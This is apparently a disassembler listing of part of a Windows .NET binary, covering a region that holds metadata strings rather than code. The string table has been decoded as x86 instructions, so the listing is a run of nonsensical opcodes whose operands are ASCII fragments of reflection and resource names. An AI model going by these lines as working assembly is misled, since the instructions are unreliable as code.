  406ac2:	add    BYTE PTR [edi+0x62],cl
  406ac5:	push   0x65
  406ac7:	arpl   WORD PTR [eax+eax*1+0x53],si
  406acb:	jns    0x406b40
  406acd:	je     0x406b34
  406acf:	ins    DWORD PTR es:[edi],dx
  406ad0:	cs push edx
  406ad2:	gs data16 ins BYTE PTR es:[edi],dx
  406ad5:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406ada:	outs   dx,BYTE PTR ds:[esi]
  406adb:	add    BYTE PTR [edx+0x69],al
  406ade:	outs   dx,BYTE PTR ds:[esi]
  406adf:	imul   ebp,DWORD PTR fs:[esi+0x67],0x67616c46
  406ae7:	jae    0x406ae9
  406ae9:	dec    edi
  406aea:	jo     0x406b51
  406aec:	jb     0x406b4f
  406aee:	je     0x406b59
  406af0:	outs   dx,DWORD PTR ds:[esi]
  406af1:	outs   dx,BYTE PTR ds:[esi]
  406af2:	push   ebx
  406af3:	gs popa 
  406af5:	jb     0x406b5a
  406af7:	push   0x67616c46
  406afc:	jae    0x406afe
  406afe:	inc    ebp
  406aff:	jbe    0x406b66
  406b01:	outs   dx,BYTE PTR ds:[esi]
  406b02:	je     0x406b57
  406b04:	gs popa 
  406b06:	jb     0x406b6b
  406b08:	push   0x67616c46
  406b0d:	jae    0x406b0f
  406b0f:	push   eax
  406b10:	jb     0x406b81
  406b12:	jo     0x406b79
  406b14:	jb     0x406b8a
  406b16:	jns    0x406b6b
  406b18:	gs popa 
  406b1a:	jb     0x406b7f
  406b1c:	push   0x67616c46
  406b21:	jae    0x406b23
  406b23:	inc    esi
  406b24:	imul   esp,DWORD PTR [ebp+0x6c],0x61655364
  406b2b:	jb     0x406b90
  406b2d:	push   0x67616c46
  406b32:	jae    0x406b34
  406b34:	push   ebx
  406b35:	jns    0x406baa
  406b37:	je     0x406b9e
  406b39:	ins    DWORD PTR es:[edi],dx
  406b3a:	cs dec ecx
  406b3c:	dec    edi
  406b3d:	add    BYTE PTR [ebp+eiz*2+0x78],dl
  406b41:	je     0x406b9a
  406b43:	jb     0x406bae
  406b45:	je     0x406bac
  406b47:	jb     0x406b49
  406b49:	outs   dx,DWORD PTR ds:[esi]
  406b4a:	jne    0x406bc0
  406b4c:	jo     0x406bc3
  406b4e:	je     0x406ba3
  406b50:	je     0x406bc4
  406b52:	gs popa 
  406b54:	ins    DWORD PTR es:[edi],dx
  406b55:	add    BYTE PTR [esi],ch
  406b57:	arpl   WORD PTR [edi+ebp*2+0x72],si
  406b5b:	add    BYTE PTR [edi+0x65],al
  406b5e:	outs   dx,BYTE PTR ds:[esi]
  406b5f:	gs jb  0x406bc3
  406b62:	je     0x406bc9
  406b64:	inc    ecx
  406b65:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  406b69:	imul   esi,DWORD PTR [ecx+ebp*2+0x65],0x79530073
  406b71:	jae    0x406be7
  406b73:	gs ins DWORD PTR es:[edi],dx
  406b75:	cs inc ebx
  406b77:	outs   dx,DWORD PTR ds:[esi]
  406b78:	ins    BYTE PTR es:[edi],dx
  406b79:	ins    BYTE PTR es:[edi],dx
  406b7a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406b7f:	outs   dx,BYTE PTR ds:[esi]
  406b80:	jae    0x406bb0
  406b82:	inc    edi
  406b83:	outs   dx,BYTE PTR gs:[esi]
  406b85:	gs jb  0x406bf1
  406b88:	arpl   WORD PTR [eax],ax
  406b8a:	dec    esp
  406b8b:	imul   esi,DWORD PTR [ebx+0x74],0x4d003160
  406b92:	gs je  0x406bfd
  406b95:	outs   dx,DWORD PTR ds:[esi]
  406b96:	fs dec ecx
  406b98:	outs   dx,BYTE PTR ds:[esi]
  406b99:	outs   dx,WORD PTR ds:[esi]
  406b9b:	add    BYTE PTR [ecx+edi*2+0x70],dl
  406b9f:	add    BYTE PTR gs:[esi+0x69],al
  406ba3:	outs   dx,BYTE PTR ds:[esi]
  406ba4:	fs dec edi
  406ba6:	jo     0x406c0d
  406ba8:	jb     0x406c0b
  406baa:	je     0x406c15
  406bac:	outs   dx,DWORD PTR ds:[esi]
  406bad:	outs   dx,BYTE PTR ds:[esi]
  406bae:	jae    0x406bb0
  406bb0:	dec    ebp
  406bb1:	gs ins DWORD PTR es:[edi],dx
  406bb3:	bound  esp,QWORD PTR [ebp+0x72]
  406bb6:	dec    ecx
  406bb7:	outs   dx,BYTE PTR ds:[esi]
  406bb8:	outs   dx,WORD PTR ds:[esi]
  406bba:	add    BYTE PTR [ebp+0x65],cl
  406bbd:	ins    DWORD PTR es:[edi],dx
  406bbe:	bound  esp,QWORD PTR [ebp+0x72]
  406bc1:	push   esp
  406bc2:	outs   dx,DWORD PTR ds:[esi]
  406bc3:	dec    ebp
  406bc4:	gs je  0x406c2f
  406bc7:	outs   dx,DWORD PTR ds:[esi]
  406bc8:	fs inc ebx
  406bca:	outs   dx,DWORD PTR ds:[esi]
  406bcb:	outs   dx,BYTE PTR ds:[esi]
  406bcc:	jbe    0x406c33
  406bce:	jb     0x406c44
  406bd0:	gs jb  0x406bd3
  406bd3:	push   ebx
  406bd4:	jns    0x406c49
  406bd6:	je     0x406c3d
  406bd8:	ins    DWORD PTR es:[edi],dx
  406bd9:	cs inc ebx
  406bdb:	outs   dx,DWORD PTR ds:[esi]
  406bdc:	fs gs inc esp
  406bdf:	outs   dx,DWORD PTR ds:[esi]
  406be0:	ins    DWORD PTR es:[edi],dx
  406be1:	add    BYTE PTR [ebx+0x6f],al
  406be4:	fs gs dec esi
  406be7:	popa   
  406be8:	ins    DWORD PTR es:[edi],dx
  406be9:	gs jae 0x406c5c
  406bec:	popa   
  406bed:	arpl   WORD PTR [ebp+0x0],sp
  406bf0:	inc    ecx
  406bf1:	fs fs dec esi
  406bf4:	popa   
  406bf5:	ins    DWORD PTR es:[edi],dx
  406bf6:	gs jae 0x406c69
  406bf9:	popa   
  406bfa:	arpl   WORD PTR [ebp+0x49],sp
  406bfd:	ins    DWORD PTR es:[edi],dx
  406bfe:	jo     0x406c6f
  406c00:	jb     0x406c76
  406c02:	jae    0x406c04
  406c04:	inc    ebx
  406c05:	outs   dx,DWORD PTR ds:[esi]
  406c06:	fs gs push esp
  406c09:	jns    0x406c7b
  406c0b:	gs inc esp
  406c0d:	arpl   WORD PTR gs:[ecx+eiz*2+0x72],bp
  406c12:	popa   
  406c13:	je     0x406c7e
  406c15:	outs   dx,DWORD PTR ds:[esi]
  406c16:	outs   dx,BYTE PTR ds:[esi]
  406c17:	add    BYTE PTR [ecx+0x64],al
  406c1a:	fs inc ebx
  406c1c:	outs   dx,DWORD PTR ds:[esi]
  406c1d:	outs   dx,BYTE PTR ds:[esi]
  406c1e:	jae    0x406c94
  406c20:	jb     0x406c97
  406c22:	arpl   WORD PTR [edi+ebp*2+0x72],si
  406c26:	add    BYTE PTR [edi+0x65],al
  406c29:	outs   dx,BYTE PTR ds:[esi]
  406c2a:	gs jb  0x406c8e
  406c2d:	je     0x406c94
  406c2f:	inc    ecx
  406c30:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  406c34:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x65646f43
  406c3c:	dec    ebp
  406c3d:	gs ins DWORD PTR es:[edi],dx
  406c3f:	bound  esp,QWORD PTR [ebp+0x72]
  406c42:	dec    ebp
  406c43:	gs je  0x406cae
  406c46:	outs   dx,DWORD PTR ds:[esi]
  406c47:	add    BYTE PTR fs:[ecx+0x64],al
  406c4b:	fs push edx
  406c4d:	gs je  0x406cc5
  406c50:	jb     0x406cc0
  406c52:	push   eax
  406c53:	popa   
  406c54:	jb     0x406cb7
  406c56:	ins    DWORD PTR es:[edi],dx
  406c57:	gs je  0x406cbf
  406c5a:	jb     0x406c5c
  406c5c:	inc    ebx
  406c5d:	jb     0x406cc4
  406c5f:	popa   
  406c60:	je     0x406cc7
  406c62:	dec    ecx
  406c63:	outs   dx,BYTE PTR ds:[esi]
  406c64:	jbe    0x406cd5
  406c66:	imul   ebp,DWORD PTR [ecx+0x6e],0x67
  406c6a:	dec    ebp
  406c6b:	gs je  0x406cd6
  406c6e:	outs   dx,DWORD PTR ds:[esi]
  406c6f:	add    BYTE PTR fs:[ebx+0x72],al
  406c73:	gs popa 
  406c75:	je     0x406cdc
  406c77:	dec    edi
  406c78:	outs   dx,BYTE PTR ds:[esi]
  406c79:	dec    ebp
  406c7a:	gs je  0x406ce5
  406c7d:	outs   dx,DWORD PTR ds:[esi]
  406c7e:	fs dec ecx
  406c80:	outs   dx,BYTE PTR ds:[esi]
  406c81:	jbe    0x406cf2
  406c83:	imul   esp,DWORD PTR [ebp+0x64],0x4d
  406c87:	gs je  0x406cf2
  406c8a:	outs   dx,DWORD PTR ds:[esi]
  406c8b:	add    BYTE PTR fs:[ebx+0x6f],al
  406c8f:	fs gs inc ebx
  406c92:	outs   dx,DWORD PTR ds:[esi]
  406c93:	outs   dx,BYTE PTR ds:[esi]
  406c94:	jae    0x406d0a
  406c96:	jb     0x406d0d
  406c98:	arpl   WORD PTR [edi+ebp*2+0x72],si
  406c9c:	add    BYTE PTR [ebx+0x6f],al
  406c9f:	fs gs inc ebp
  406ca2:	js     0x406d14
  406ca4:	jb     0x406d0b
  406ca6:	jae    0x406d1b
  406ca8:	imul   ebp,DWORD PTR [edi+0x6e],0x65764f00
  406caf:	jb     0x406d23
  406cb1:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x65706f72
  406cb9:	jb     0x406d2f
  406cbb:	jns    0x406cbd
  406cbd:	dec    edi
  406cbe:	jbe    0x406d25
  406cc0:	jb     0x406d34
  406cc2:	imul   esp,DWORD PTR [ebp+eiz*2+0x49],0x7265746e
  406cca:	popaw  
  406ccc:	arpl   WORD PTR [ebp+0x54],sp
  406ccf:	jns    0x406d41
  406cd1:	add    BYTE PTR gs:[edi+0x76],cl
  406cd5:	gs jb  0x406d4a
  406cd8:	imul   esp,DWORD PTR [ebp+eiz*2+0x4f],0x61726570
  406ce0:	je     0x406d4b
  406ce2:	outs   dx,DWORD PTR ds:[esi]
  406ce3:	outs   dx,BYTE PTR ds:[esi]
  406ce4:	dec    esi
  406ce5:	popa   
  406ce6:	ins    DWORD PTR es:[edi],dx
  406ce7:	add    BYTE PTR gs:[ebx+0x6f],al
  406ceb:	fs gs push ebx
  406cee:	je     0x406d51
  406cf0:	je     0x406d57
  406cf2:	ins    DWORD PTR es:[edi],dx
  406cf3:	outs   dx,BYTE PTR gs:[esi]
  406cf5:	je     0x406cf7
  406cf7:	push   eax
  406cf8:	popa   
  406cf9:	jb     0x406d5c
  406cfb:	ins    DWORD PTR es:[edi],dx
  406cfc:	gs je  0x406d64
  406cff:	jb     0x406d4a
  406d01:	outs   dx,BYTE PTR ds:[esi]
  406d02:	outs   dx,WORD PTR ds:[esi]
  406d04:	add    BYTE PTR [ebx+0x72],al
  406d07:	gs popa 
  406d09:	je     0x406d70
  406d0b:	inc    ecx
  406d0c:	jae    0x406d81
  406d0e:	imul   esp,DWORD PTR [edi+0x6e],0x61726150
  406d15:	ins    DWORD PTR es:[edi],dx
  406d16:	gs je  0x406d7e
  406d19:	jb     0x406d6e
  406d1b:	je     0x406d7e
  406d1d:	je     0x406d84
  406d1f:	ins    DWORD PTR es:[edi],dx
  406d20:	outs   dx,BYTE PTR gs:[esi]
  406d22:	je     0x406d24
  406d24:	push   ebp
  406d25:	outs   dx,BYTE PTR ds:[esi]
  406d26:	imul   esi,DWORD PTR [ecx+0x75],0x6f725065
  406d2d:	jo     0x406d94
  406d2f:	jb     0x406da5
  406d31:	jns    0x406d81
  406d33:	popa   
  406d34:	ins    DWORD PTR es:[edi],dx
  406d35:	add    BYTE PTR gs:[ebx+0x6f],al
  406d39:	fs gs dec ebp
  406d3c:	gs ins DWORD PTR es:[edi],dx
  406d3e:	bound  esp,QWORD PTR [ebp+0x72]
  406d41:	inc    esi
  406d42:	imul   esp,DWORD PTR [ebp+0x6c],0x72430064
  406d49:	gs popa 
  406d4b:	je     0x406db2
  406d4d:	inc    esp
  406d4e:	gs jo  0x406db6
  406d51:	outs   dx,BYTE PTR ds:[esi]
  406d52:	fs outs dx,BYTE PTR gs:[esi]
  406d55:	arpl   WORD PTR [ecx+0x50],di
  406d58:	jb     0x406dc9
  406d5a:	jo     0x406dc1
  406d5c:	jb     0x406dd2
  406d5e:	jns    0x406d60
  406d60:	inc    ebx
  406d61:	outs   dx,DWORD PTR ds:[esi]
  406d62:	fs gs dec ebp
  406d65:	gs ins DWORD PTR es:[edi],dx
  406d67:	bound  esp,QWORD PTR [ebp+0x72]
  406d6a:	push   eax
  406d6b:	jb     0x406ddc
  406d6d:	jo     0x406dd4
  406d6f:	jb     0x406de5
  406d71:	jns    0x406d73
  406d73:	inc    ebx
  406d74:	jb     0x406ddb
  406d76:	popa   
  406d77:	je     0x406dde
  406d79:	push   eax
  406d7a:	jb     0x406deb
  406d7c:	jo     0x406de3
  406d7e:	jb     0x406df4
  406d80:	jns    0x406d82
  406d82:	inc    esp
  406d83:	gs jo  0x406deb
  406d86:	outs   dx,BYTE PTR ds:[esi]
  406d87:	fs outs dx,BYTE PTR gs:[esi]
  406d8a:	arpl   WORD PTR [ecx+0x50],di
  406d8d:	jb     0x406dfe
  406d8f:	jo     0x406df6
  406d91:	jb     0x406e07
  406d93:	jns    0x406de3
  406d95:	popa   
  406d96:	ins    DWORD PTR es:[edi],dx
  406d97:	add    BYTE PTR gs:[edi+0x70],cl
  406d9b:	gs jb  0x406dff
  406d9e:	je     0x406e09
  406da0:	outs   dx,DWORD PTR ds:[esi]
  406da1:	outs   dx,BYTE PTR ds:[esi]
  406da2:	inc    esi
  406da3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  406dab:	inc    ebp
  406dac:	jbe    0x406e13
  406dae:	outs   dx,BYTE PTR ds:[esi]
  406daf:	je     0x406dfa
  406db1:	outs   dx,BYTE PTR ds:[esi]
  406db2:	outs   dx,WORD PTR ds:[esi]
  406db4:	add    BYTE PTR [esi+0x69],al
  406db7:	outs   dx,BYTE PTR ds:[esi]
  406db8:	fs inc ebp
  406dba:	jbe    0x406e21
  406dbc:	outs   dx,BYTE PTR ds:[esi]
  406dbd:	je     0x406e32
  406dbf:	add    BYTE PTR [ebp+0x65],cl
  406dc2:	ins    DWORD PTR es:[edi],dx
  406dc3:	bound  esp,QWORD PTR [ebp+0x72]
  406dc6:	push   esp
  406dc7:	outs   dx,DWORD PTR ds:[esi]
  406dc8:	inc    ebp
  406dc9:	jbe    0x406e30
  406dcb:	outs   dx,BYTE PTR ds:[esi]
  406dcc:	je     0x406e11
  406dce:	outs   dx,DWORD PTR ds:[esi]
  406dcf:	outs   dx,BYTE PTR ds:[esi]
  406dd0:	jbe    0x406e37
  406dd2:	jb     0x406e48
  406dd4:	gs jb  0x406dd7
  406dd7:	inc    ebx
  406dd8:	jb     0x406e3f
  406dda:	popa   
  406ddb:	je     0x406e42
  406ddd:	inc    ecx
  406dde:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  406de2:	imul   esi,DWORD PTR [ecx+edi*2+0x4e],0x73656d61
  406dea:	jo     0x406e4d
  406dec:	arpl   WORD PTR [ebp+0x0],sp
  406def:	push   esi
  406df0:	popa   
  406df1:	ins    BYTE PTR es:[edi],dx
  406df2:	imul   esp,DWORD PTR [ebp+eax*2+0x76],0x746e65
  406dfa:	inc    ebx
  406dfb:	jb     0x406e62
  406dfd:	popa   
  406dfe:	je     0x406e65
  406e00:	dec    ecx
  406e01:	outs   dx,BYTE PTR ds:[esi]
  406e02:	jbe    0x406e73
  406e04:	imul   esp,DWORD PTR [ebp+0x64],0x4d
  406e08:	gs je  0x406e73
  406e0b:	outs   dx,DWORD PTR ds:[esi]
  406e0c:	add    BYTE PTR fs:[ebx+0x72],al
  406e10:	gs popa 
  406e12:	je     0x406e79
  406e14:	inc    ecx
  406e15:	jae    0x406e8a
  406e17:	imul   esp,DWORD PTR [edi+0x6e],0x646e6553
  406e1e:	gs jb  0x406e74
  406e21:	je     0x406e84
  406e23:	je     0x406e8a
  406e25:	ins    DWORD PTR es:[edi],dx
  406e26:	outs   dx,BYTE PTR gs:[esi]
  406e28:	je     0x406e2a
  406e2a:	inc    ebx
  406e2b:	jb     0x406e92
  406e2d:	popa   
  406e2e:	je     0x406e95
  406e30:	inc    ecx
  406e31:	jae    0x406ea6
  406e33:	imul   esp,DWORD PTR [edi+0x6e],0x61745345
  406e3a:	je     0x406ea1
  406e3c:	ins    DWORD PTR es:[edi],dx
  406e3d:	outs   dx,BYTE PTR gs:[esi]
  406e3f:	je     0x406e41
  406e41:	inc    ebx
  406e42:	jb     0x406ea9
  406e44:	popa   
  406e45:	je     0x406eac
  406e47:	inc    ecx
  406e48:	jae    0x406ebd
  406e4a:	imul   esp,DWORD PTR [edi+0x6e],0x706f7250
  406e51:	gs jb  0x406ec8
  406e54:	jns    0x406ea9
  406e56:	je     0x406eb9
  406e58:	je     0x406ebf
  406e5a:	ins    DWORD PTR es:[edi],dx
  406e5b:	outs   dx,BYTE PTR gs:[esi]
  406e5d:	je     0x406e5f
  406e5f:	inc    edi
  406e60:	gs je  0x406eb3
  406e63:	popa   
  406e64:	jb     0x406ec7
  406e66:	ins    DWORD PTR es:[edi],dx
  406e67:	gs je  0x406ecf
  406e6a:	jb     0x406ec2
  406e6c:	popa   
  406e6d:	ins    BYTE PTR es:[edi],dx
  406e6e:	jne    0x406ed5
  406e70:	add    BYTE PTR [ecx+0x45],cl
  406e73:	outs   dx,BYTE PTR ds:[esi]
  406e74:	jne    0x406ee3
  406e76:	gs jb  0x406eda
  406e79:	bound  ebp,QWORD PTR [ebp+eiz*2+0x60]
  406e7d:	xor    DWORD PTR [eax],eax
  406e7f:	push   eax
  406e80:	jb     0x406ef1
  406e82:	jo     0x406ee9
  406e84:	jb     0x406efa
  406e86:	jns    0x406ed1
  406e88:	outs   dx,BYTE PTR ds:[esi]
  406e89:	outs   dx,WORD PTR ds:[esi]
  406e8b:	add    BYTE PTR [esi+0x6f],cl
  406e8e:	outs   dx,BYTE PTR ds:[esi]
  406e8f:	push   edi
  406e90:	outs   dx,DWORD PTR ds:[esi]
  406e91:	jb     0x406efe
  406e93:	data16 ins BYTE PTR es:[edi],dx
  406e95:	outs   dx,DWORD PTR ds:[esi]
  406e96:	ja     0x406ee5
  406e98:	gs jae 0x406f0e
  406e9b:	popa   
  406e9c:	addr16 gs push eax
  406e9f:	jb     0x406f10
  406ea1:	jo     0x406f08
  406ea3:	jb     0x406f19
  406ea5:	imul   esp,DWORD PTR [ebp+0x73],0x65694600
  406eac:	ins    BYTE PTR es:[edi],dx
  406ead:	fs dec ecx
  406eaf:	outs   dx,BYTE PTR ds:[esi]
  406eb0:	outs   dx,WORD PTR ds:[esi]
  406eb2:	add    BYTE PTR [esi+0x6f],cl
  406eb5:	outs   dx,BYTE PTR ds:[esi]
  406eb6:	push   edi
  406eb7:	outs   dx,DWORD PTR ds:[esi]
  406eb8:	jb     0x406f25
  406eba:	data16 ins BYTE PTR es:[edi],dx
  406ebc:	outs   dx,DWORD PTR ds:[esi]
  406ebd:	ja     0x406f0c
  406ebf:	gs jae 0x406f35
  406ec2:	popa   
  406ec3:	addr16 gs inc esi
  406ec6:	imul   esp,DWORD PTR [ebp+0x6c],0x41007364
  406ecd:	fs fs inc ecx
  406ed0:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  406ed4:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  406edc:	bound  esi,QWORD PTR [ebp+0x74]
  406edf:	gs jae 0x406ee2
  406ee2:	inc    ebp
  406ee3:	jbe    0x406f4a
  406ee5:	outs   dx,BYTE PTR ds:[esi]
  406ee6:	je     0x406f2e
  406ee8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  406ef0:	dec    ecx
  406ef1:	outs   dx,BYTE PTR ds:[esi]
  406ef2:	outs   dx,WORD PTR ds:[esi]
  406ef4:	add    BYTE PTR [ebp+0x72],al
  406ef7:	jb     0x406f68
  406ef9:	jb     0x406efb
  406efb:	inc    ebx
  406efc:	outs   dx,DWORD PTR ds:[esi]
  406efd:	fs gs inc ebx
  406f00:	outs   dx,DWORD PTR ds:[esi]
  406f01:	ins    DWORD PTR es:[edi],dx
  406f02:	jo     0x406f6d
  406f04:	ins    BYTE PTR es:[edi],dx
  406f05:	gs push ebp
  406f07:	outs   dx,BYTE PTR ds:[esi]
  406f08:	imul   esi,DWORD PTR [eax+eax*1+0x53],0x61697265
  406f10:	ins    BYTE PTR es:[edi],dx
  406f11:	imul   edi,DWORD PTR [edx+0x65],0x61466900
  406f18:	arpl   WORD PTR [ebp+0x0],sp
  406f1b:	outs   dx,DWORD PTR ds:[esi]
  406f1c:	jo     0x406f91
  406f1e:	push   esp
  406f1f:	outs   dx,DWORD PTR ds:[esi]
  406f20:	inc    esi
  406f21:	imul   ebp,DWORD PTR [esi+0x64],0x74756f00
  406f28:	jo     0x406f9f
  406f2a:	je     0x406f70
  406f2c:	imul   esi,DWORD PTR [edx+0x0],0x7074756f
  406f33:	jne    0x406fa9
  406f35:	dec    esi
  406f36:	jae    0x406f38
  406f38:	arpl   WORD PTR [edi+0x6c],bp
  406f3b:	ins    BYTE PTR es:[edi],dx
  406f3c:	popa   
  406f3d:	jo     0x406fb2
  406f3f:	gs inc ecx
  406f41:	jb     0x406faa
  406f43:	jae    0x406f45
  406f45:	imul   ebp,DWORD PTR [esi+0x63],0x6564756c
  406f4c:	push   ebx
  406f4d:	outs   dx,BYTE PTR gs:[esi]
  406f4f:	fs gs jb 0x406f53
  406f53:	ins    BYTE PTR es:[edi],dx
  406f54:	popa   
  406f55:	outs   dx,BYTE PTR ds:[esi]
  406f56:	addr16 jne 0x406fba
  406f59:	add    BYTE PTR gs:[bx+0x65],ah
  406f5e:	je     0x406fbf
  406f60:	dec    ecx
  406f61:	outs   dx,BYTE PTR ds:[esi]
  406f62:	je     0x406fc9
  406f64:	jb     0x406fcc
  406f66:	popa   
  406f67:	arpl   WORD PTR [ebp+0x0],sp
  406f6a:	addr16 gs je 0x406fcd
  406f6e:	dec    esp
  406f6f:	popa   
  406f70:	outs   dx,BYTE PTR ds:[esi]
  406f71:	addr16 jne 0x406fd5
  406f74:	add    BYTE PTR gs:[bp+di+0x65],dh
  406f79:	je     0x406fda
  406f7b:	dec    esp
  406f7c:	popa   
  406f7d:	outs   dx,BYTE PTR ds:[esi]
  406f7e:	addr16 jne 0x406fe2
  406f81:	add    BYTE PTR gs:[bx+0x65],ah
  406f86:	je     0x406fe7
  406f88:	dec    edi
  406f89:	jne    0x406fff
  406f8b:	jo     0x407002
  406f8d:	je     0x406fd3
  406f8f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  406f96:	jns    0x406f98
  406f98:	jae    0x406fff
  406f9a:	je     0x406ffb
  406f9c:	dec    edi
  406f9d:	jne    0x407013
  406f9f:	jo     0x407016
  406fa1:	je     0x406fe7
  406fa3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  406faa:	jns    0x406fac
  406fac:	addr16 gs je 0x40700f
  406fb0:	dec    edi
  406fb1:	jne    0x407027
  406fb3:	jo     0x40702a
  406fb5:	je     0x407005
  406fb7:	popa   
  406fb8:	ins    DWORD PTR es:[edi],dx
  406fb9:	gs jae 0x40702c
  406fbc:	popa   
  406fbd:	arpl   WORD PTR [ebp+0x0],sp
  406fc0:	jae    0x407027
  406fc2:	je     0x407023
  406fc4:	dec    edi
  406fc5:	jne    0x40703b
  406fc7:	jo     0x40703e
  406fc9:	je     0x407019
  406fcb:	popa   
  406fcc:	ins    DWORD PTR es:[edi],dx
  406fcd:	gs jae 0x407040
  406fd0:	popa   
  406fd1:	arpl   WORD PTR [ebp+0x0],sp
  406fd4:	addr16 gs je 0x407037
  406fd8:	inc    ebx
  406fd9:	outs   dx,DWORD PTR ds:[esi]
  406fda:	ins    BYTE PTR es:[edi],dx
  406fdb:	ins    BYTE PTR es:[edi],dx
  406fdc:	popa   
  406fdd:	jo     0x407052
  406fdf:	gs inc ebp
  406fe1:	jbe    0x407048
  406fe3:	outs   dx,BYTE PTR ds:[esi]
  406fe4:	je     0x407027
  406fe6:	jb     0x40704f
  406fe8:	jae    0x406fea
  406fea:	jae    0x407051
  406fec:	je     0x40704d
  406fee:	inc    ebx
  406fef:	outs   dx,DWORD PTR ds:[esi]
  406ff0:	ins    BYTE PTR es:[edi],dx
  406ff1:	ins    BYTE PTR es:[edi],dx
  406ff2:	popa   
  406ff3:	jo     0x407068
  406ff5:	gs inc ebp
  406ff7:	jbe    0x40705e
  406ff9:	outs   dx,BYTE PTR ds:[esi]
  406ffa:	je     0x40703d
  406ffc:	jb     0x407065
  406ffe:	jae    0x407000
  407000:	addr16 gs je 0x407063
  407004:	dec    ecx
  407005:	outs   dx,BYTE PTR ds:[esi]
  407006:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  40700a:	gs push ebx
  40700c:	outs   dx,BYTE PTR gs:[esi]
  40700e:	fs gs jb 0x407012
  407012:	jae    0x407079
  407014:	je     0x407075
  407016:	dec    ecx
  407017:	outs   dx,BYTE PTR ds:[esi]
  407018:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  40701c:	gs push ebx
  40701e:	outs   dx,BYTE PTR gs:[esi]
  407020:	fs gs jb 0x407024
  407024:	addr16 gs je 0x407087
  407028:	dec    edi
  407029:	jne    0x40709f
  40702b:	jo     0x4070a2
  40702d:	je     0x407082
  40702f:	je     0x4070a3
  407031:	gs popa 
  407033:	ins    DWORD PTR es:[edi],dx
  407034:	add    BYTE PTR [ebx+0x65],dh
  407037:	je     0x407098
  407039:	dec    edi
  40703a:	jne    0x4070b0
  40703c:	jo     0x4070b3
  40703e:	je     0x407093
  407040:	je     0x4070b4
  407042:	gs popa 
  407044:	ins    DWORD PTR es:[edi],dx
  407045:	add    BYTE PTR [ecx+0x6e],cl
  407048:	je     0x4070af
  40704a:	jb     0x4070b2
  40704c:	popa   
  40704d:	arpl   WORD PTR [ebp+0x0],sp
  407050:	dec    esp
  407051:	popa   
  407052:	outs   dx,BYTE PTR ds:[esi]
  407053:	addr16 jne 0x4070b7
  407056:	add    BYTE PTR gs:[bx+0x75],cl
  40705b:	je     0x4070cd
  40705d:	jne    0x4070d3
  40705f:	inc    esp
  407060:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  407067:	jns    0x407069
  407069:	dec    edi
  40706a:	jne    0x4070e0
  40706c:	jo     0x4070e3
  40706e:	je     0x4070be
  407070:	popa   
  407071:	ins    DWORD PTR es:[edi],dx
  407072:	gs jae 0x4070e5
  407075:	popa   
  407076:	arpl   WORD PTR [ebp+0x0],sp
  407079:	inc    ebx
  40707a:	outs   dx,DWORD PTR ds:[esi]
  40707b:	ins    BYTE PTR es:[edi],dx
  40707c:	ins    BYTE PTR es:[edi],dx
  40707d:	popa   
  40707e:	jo     0x4070f3
  407080:	gs inc ebp
  407082:	jbe    0x4070e9
  407084:	outs   dx,BYTE PTR ds:[esi]
  407085:	je     0x4070c8
  407087:	jb     0x4070f0
  407089:	jae    0x40708b
  40708b:	dec    ecx
  40708c:	outs   dx,BYTE PTR ds:[esi]
  40708d:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  407091:	gs push ebx
  407093:	outs   dx,BYTE PTR gs:[esi]
  407095:	fs gs jb 0x407099
  407099:	dec    edi
  40709a:	jne    0x407110
  40709c:	jo     0x407113
  40709e:	je     0x4070f3
  4070a0:	je     0x407114
  4070a2:	gs popa 
  4070a4:	ins    DWORD PTR es:[edi],dx
  4070a5:	add    BYTE PTR [ebx+0x79],dl
  4070a8:	jae    0x40711e
  4070aa:	gs ins DWORD PTR es:[edi],dx
  4070ac:	cs push edx
  4070ae:	gs jae 0x407120
  4070b1:	jne    0x407125
  4070b3:	arpl   WORD PTR [ebp+0x73],sp
  4070b6:	add    BYTE PTR [edx+0x65],dl
  4070b9:	jae    0x40712a
  4070bb:	jne    0x40712f
  4070bd:	arpl   WORD PTR [ebp+0x4d],sp
  4070c0:	popa   
  4070c1:	outs   dx,BYTE PTR ds:[esi]
  4070c2:	popa   
  4070c3:	addr16 gs jb 0x4070c7
  4070c7:	jb     0x40712e
  4070c9:	jae    0x40713a
  4070cb:	jne    0x40713f
  4070cd:	arpl   WORD PTR [ebp+0x4d],sp
  4070d0:	popa   
  4070d1:	outs   dx,BYTE PTR ds:[esi]
  4070d2:	add    BYTE PTR [ebx+0x79],dl
  4070d5:	jae    0x40714b
  4070d7:	gs ins DWORD PTR es:[edi],dx
  4070d9:	cs inc edi
  4070db:	ins    BYTE PTR es:[edi],dx
  4070dc:	outs   dx,DWORD PTR ds:[esi]
  4070dd:	bound  esp,QWORD PTR [ecx+0x6c]
  4070e0:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  4070e7:	add    BYTE PTR [ebx+0x75],al
  4070ea:	ins    BYTE PTR es:[edi],dx
  4070eb:	je     0x407162
  4070ed:	jb     0x407154
  4070ef:	dec    ecx
  4070f0:	outs   dx,BYTE PTR ds:[esi]
  4070f1:	outs   dx,WORD PTR ds:[esi]
  4070f3:	add    BYTE PTR [edx+0x65],dh
  4070f6:	jae    0x407167
  4070f8:	jne    0x40716c
  4070fa:	arpl   WORD PTR [ebp+0x43],sp
  4070fd:	jne    0x40716b
  4070ff:	je     0x407176
  407101:	jb     0x407168
  407103:	add    BYTE PTR [edi+0x65],ah
  407106:	je     0x407167
  407108:	push   edx
  407109:	gs jae 0x40717b
  40710c:	jne    0x407180
  40710e:	arpl   WORD PTR [ebp+0x4d],sp
  407111:	popa   
  407112:	outs   dx,BYTE PTR ds:[esi]
  407113:	popa   
  407114:	addr16 gs jb 0x407118
